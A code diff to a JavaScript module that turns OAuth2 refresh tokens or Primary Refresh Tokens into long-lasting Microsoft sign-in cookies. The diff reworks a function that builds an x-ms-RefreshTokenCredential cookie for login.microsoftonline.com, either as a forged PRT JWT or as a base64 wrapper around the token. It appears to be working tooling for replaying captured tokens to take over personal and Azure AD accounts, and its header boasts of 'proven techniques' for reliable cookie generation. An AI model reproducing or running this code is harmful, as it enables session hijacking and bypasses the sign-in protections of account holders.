@@ -3,7 +3,7 @@
  * Converts OAuth2 refresh tokens/PRT to long-lasting session cookies
  * Supports both personal (MSA) and work/school (Azure AD) accounts
  * 
- * Enhanced with competitor-proven techniques for
+ * Enhanced with our proven techniques for
  reliable cookie generation */
 'use strict';
 
@@ -178,8 +178,8 @@ function detectAccountTypeFromContext(token, email, tenant) {
  * - A full token response object (from /token endpoint) -> extracts
  all fields auto */
 function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts = {}) {
+  let refreshToken, tid, uid, clientId, scopes;
 
-  let refreshToken, tid, uid, clientId, scopes;  
   // Handle object input (full token response from Microsoft)
   if (typeof tokenResponse === 'object' && !Array.isArray(tokenResponse)) {
     refreshToken = tokenResponse.refresh_token || tokenResponse.access_token;
@@ -187,7 +187,7 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
     uid = extraOpts.uid || '';
     clientId = extraOpts.clientId || CLIENT_ID;
     scopes = extraOpts.scopes || PRT_SCOPES;
-    
+
     // Try to extract client_info from the response
     if (tokenResponse.client_info && !uid) {
       try {
@@ -195,13 +195,11 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
         uid = decoded.uid;
         tid = decoded.utid || tid;
       } catch (e) {
-        // client_info might be a plain string, try direct decode
         try {
           const decoded = decodeClientInfo(tokenResponse.client_info);
           uid = decoded.uid;
           tid = decoded.utid || tid;
         } catch (e2) {
-          // Usetid from id_token decoding          
           if (tokenResponse.id_token) {
             const idPayload = decodeIdToken(tokenResponse.id_token);
             tid = idPayload.tid || tid;
@@ -209,62 +207,32 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
         }
       }
     }
-    
+
     // Fallback: decode id_token for tid if still missing
     if (!tid && tokenResponse.id_token) {
       try {
         const idPayload = decodeIdToken(tokenResponse.id_token);
-        tid = idPayload.tid ||'';
+        tid = idPayload.tid || '';
       } catch (e) {}
-    }    
-    // If we have a plain string refresh token (not from token response)
-    if (typeof tokenResponse === 'string') {
-      refreshToken = tokenResponse;
-      clientId = extraOpts.clientId || CLIENT_ID;
-      scopes = extraOpts.scopes || PRT_SCOPES;
-    }    
-    // For personal accounts use base64 encoding
-    if (accountType === 'personal') {
-      const credential = JSON.stringify({
-        token_type: 'Bearer',
-        refresh_token: refreshToken,
-        expires_in: 1209599
-      });
-      return {
-        name: 'x-ms-RefreshTokenCredential',
-        value: Buffer.from(credential).toString('base64'),
-        domain: '.login.microsoftonline.com',
-      };
     }
-    
-    // For work/school accounts, build PRT JWT
-    // Only if we have uid (required for PRT)
-    if (accountType === 'work_school' && refreshToken && uid && tid) {
-      try {
-        const prtJwt = buildPRTJwt(refreshToken, clientId, scopes, tid, uid, true, true);
-        console.log('[CookieConverter] PRT JWT generated (uid=' + uid.substring(0, 8) + '..., tid=' + tid + ')');
-        return {
-          name: 'x-ms-RefreshTokenCredential',
-          value: prtJwt,
-          domain: '.login.microsoftonline.com',
-        };
-      } catch (err) {
-        console.warn('[CookieConverter] PRT JWT build failed, falling back to base64:', err.message); }
-      
-      // Fallback to base64 if PRT JWT fails
-      const credential = JSON.stringify({
-        token_type: 'Bearer',
-        refresh_token: refreshToken,
-        expires_in: 1209599
-      });
-      return {
-        name: 'x-ms-RefreshTokenCredential',
-        value: Buffer.from(credential).toString('base64'),
-        domain: '.login.microsoftonline.com',
-      };
-    }
-    
-    // Unknown account type - default to base64
+  }
+
+  // Handle string input (plain refresh token) - FIXED: moved outside the object check
+  if (typeof tokenResponse === 'string') {
+    refreshToken = tokenResponse;
+    clientId = extraOpts.clientId || CLIENT_ID;
+    scopes = extraOpts.scopes || PRT_SCOPES;
+    tid = extraOpts.tid || '';
+    uid = extraOpts.uid || '';
+  }
+
+  // If no refresh token, return null
+  if (!refreshToken) {
+    return null;
+  }
+
+  // For personal accounts use base64 encoding
+  if (accountType === 'personal') {
     const credential = JSON.stringify({
       token_type: 'Bearer',
       refresh_token: refreshToken,
@@ -276,6 +244,45 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
       domain: '.login.microsoftonline.com',
     };
   }
+
+  // For work/school accounts, build PRT JWT
+  if (accountType === 'work_school' && refreshToken && uid && tid) {
+    try {
+      const prtJwt = buildPRTJwt(refreshToken, clientId, scopes, tid, uid, true, true);
+      console.log('[CookieConverter] PRT JWT generated (uid=' + uid.substring(0, 8) + '..., tid=' + tid + ')');
+      return {
+        name: 'x-ms-RefreshTokenCredential',
+        value: prtJwt,
+        domain: '.login.microsoftonline.com',
+      };
+    } catch (err) {
+      console.warn('[CookieConverter] PRT JWT build failed, falling back to base64:', err.message);
+    }
+
+    // Fallback to base64 if PRT JWT fails
+    const credential = JSON.stringify({
+      token_type: 'Bearer',
+      refresh_token: refreshToken,
+      expires_in: 1209599
+    });
+    return {
+      name: 'x-ms-RefreshTokenCredential',
+      value: Buffer.from(credential).toString('base64'),
+      domain: '.login.microsoftonline.com',
+    };
+  }
+
+  // Unknown account type or missing uid/tid - default to base64
+  const credential = JSON.stringify({
+    token_type: 'Bearer',
+    refresh_token: refreshToken,
+    expires_in: 1209599
+  });
+  return {
+    name: 'x-ms-RefreshTokenCredential',
+    value: Buffer.from(credential).toString('base64'),
+    domain: '.login.microsoftonline.com',
+  };
 }
 
 /**
